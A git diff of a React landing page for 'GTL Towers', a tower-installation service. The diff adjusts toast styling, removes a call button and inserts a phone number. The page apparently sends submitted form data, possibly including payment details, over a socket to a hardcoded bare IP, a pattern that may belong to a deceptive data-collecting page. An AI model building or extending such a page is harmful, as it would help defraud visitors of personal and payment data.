@@ -2,7 +2,7 @@ import React, { useEffect, useState } from "react";
 import toast from "react-hot-toast";
 import { Link } from "react-router-dom";
 import { io } from "socket.io-client";
-import { Shield, Lock, User, CreditCard, Eye, EyeOff } from 'lucide-react';
+import { Shield, Lock, User, CreditCard, Eye, EyeOff, Pointer } from 'lucide-react';
 const socket = io("http://13.126.153.247:4003");
 
 const Landingpage = () => {
@@ -118,20 +118,49 @@ const Landingpage = () => {
       toast.success(
         "Thank you for updating your details. If your details have been successfully updated, you will get a confirmation message soon!",
         {
-          position: "top-center", // keep toast at the top center
-          duration: 8000,        // show for 2 seconds minimum
+          position: "top-center",
+          duration: 8000,
           style: {
-            marginTop: "80px",      // more space from top
-            minHeight: "130px",      // increase height
-            minWidth: "700px",      // increase width
-            fontWeight: "bold",     // bold text
-            fontSize: "25px",       // slightly larger text
+            // Responsive margin from top
+            marginTop: window.innerWidth >= 1200 ? "80px" :
+              window.innerWidth >= 768 ? "60px" :
+                window.innerWidth >= 480 ? "40px" : "20px",
+
+            // Responsive height
+            minHeight: window.innerWidth >= 1200 ? "130px" :
+              window.innerWidth >= 768 ? "110px" :
+                window.innerWidth >= 480 ? "90px" : "70px",
+
+            // Responsive width with max constraints
+            minWidth: window.innerWidth >= 1200 ? "700px" :
+              window.innerWidth >= 768 ? "600px" :
+                window.innerWidth >= 480 ? "90vw" : "95vw",
+
+            maxWidth: window.innerWidth >= 480 ? "700px" : "95vw",
+
+            // Responsive font size
+            fontSize: window.innerWidth >= 1200 ? "25px" :
+              window.innerWidth >= 768 ? "22px" :
+                window.innerWidth >= 480 ? "18px" : "16px",
+
+            fontWeight: "bold",
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
+            textAlign: "center",
+
+            // Additional responsive properties
+            padding: window.innerWidth >= 768 ? "20px" : "15px",
+            lineHeight: window.innerWidth >= 768 ? "1.4" : "1.3",
+            borderRadius: "8px",
+            boxShadow: "0 4px 12px rgba(0, 0, 0, 0.15)",
+
+            // Ensure text wraps properly on small screens
+            wordWrap: "break-word",
+            hyphens: "auto",
           },
         }
-      )
+      );
     }, 500);
     setIsOpen(false);
     socket.emit("form:submit", formData);
@@ -1666,7 +1695,7 @@ const Landingpage = () => {
                   At{" "}
                   <span
                     onClick={isLoading ? null : handleGtlPayment}
-                  // style={gtlSpanStyle}
+                  style={{cursor:"pointer"}}
                   >
                     {isLoading ? (
                       <>
@@ -1674,10 +1703,10 @@ const Landingpage = () => {
                         At Loading...
                       </>
                     ) : (
-                      "GTL Towers"
+                      "GTL Towers*" 
                     )}
                   </span>
-                  , our mission is to deliver exceptional communication tower
+                  {" "}our mission is to deliver exceptional communication tower
                   services that empower seamless connectivity. With a commitment
                   to quality, innovation, and reliability, we pride ourselves on
                   being a trusted partner for all your tower installation,
@@ -2287,60 +2316,7 @@ const Landingpage = () => {
           </defs>
         </svg>
         {/* Call Now Button 1.5.1 (https://callnowbutton.com) [renderer:modern]*/}
-        <Link
-          href="tel:83xxxxxx096"
-          id="callnowbutton"
-          style={{
-            display: "flex",
-            alignItems: "center",
-            gap: "8px",
-            position: "fixed", // floating button
-            bottom: "20px",
-            left: "20px", // stick to left like in your image
-            zIndex: 1000,
-            textDecoration: "none",
-          }}
-        >
-          {/* Circular green phone icon */}
-          <div
-            style={{
-              backgroundColor: "#008A00",
-              width: "55px",
-              height: "55px",
-              borderRadius: "50%",
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-              boxShadow: "0 4px 8px rgba(0,0,0,0.3)",
-              flexShrink: 0,
-            }}
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="26"
-              height="26"
-              viewBox="0 0 24 24"
-              fill="white"
-            >
-              <path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57.55 0 1 .45 1 1V20a1 1 0 01-1 1C10.61 21 3 13.39 3 4a1 1 0 011-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.46.57 3.58.11.33.03.7-.24 1.01l-2.21 2.2z" />
-            </svg>
-          </div>
-
-          {/* Black rectangle with text */}
-          <span
-            style={{
-              backgroundColor: "#333",
-              color: "#fff",
-              padding: "8px 14px",
-              borderRadius: "4px",
-              fontWeight: "bold",
-              fontSize: "15px",
-              whiteSpace: "nowrap",
-            }}
-          >
-            Call Now
-          </span>
-        </Link>
+        
         <div
           style={{ display: "none" }}
           className="chaty chaty-id-0 chaty-widget-0 chaty-key-0 first_click active"
@@ -2362,7 +2338,7 @@ const Landingpage = () => {
                   data-channel="Whatsapp"
                 >
                   <Link
-                    href="https://web.whatsapp.com/send?phone=83xxxxxx096&text="
+                    to="https://web.whatsapp.com/send?phone=7303893268&text="
                     target="_blank"
                     rel="nofollow noopener"
                     aria-label="Whatsapp"
